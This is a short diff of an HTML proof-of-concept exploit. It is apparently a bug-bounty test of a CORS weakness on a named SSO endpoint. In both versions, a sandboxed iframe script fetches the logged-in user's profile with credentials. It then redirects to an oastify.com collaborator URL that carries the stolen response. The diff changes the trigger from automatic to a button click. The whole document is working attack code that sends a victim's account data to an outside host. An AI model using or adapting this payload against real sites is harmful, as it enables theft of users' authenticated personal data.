@@ -1,10 +1,16 @@
-<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
-    var req = new XMLHttpRequest();
-    req.onload = reqListener;
-    req.open('get','https://sso.azion.com/api/user/me',true);
-    req.withCredentials = true;
-    req.send();
-    function reqListener() {
-      location='http://uhfk7sxlcslb1ydj5t4pysxzdqjh7ev3.oastify.com/?sss='+encodeURIComponent(this.responseText);
-    };
-  </script>"></iframe>
+<button id="sendRequest">Click to Send Request</button>
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
+  <script>
+    document.getElementById('sendRequest').addEventListener('click', function() {
+      var req = new XMLHttpRequest();
+      req.onload = reqListener;
+      req.open('get', 'https://sso.azion.com/api/user/me', true);
+      req.withCredentials = true;
+      req.send();
+    
+      function reqListener() {
+        location='http://uhfk7sxlcslb1ydj5t4pysxzdqjh7ev3.oastify.com/?sss='+encodeURIComponent(this.responseText);
+      }
+    });
+  </script>
+"></iframe>
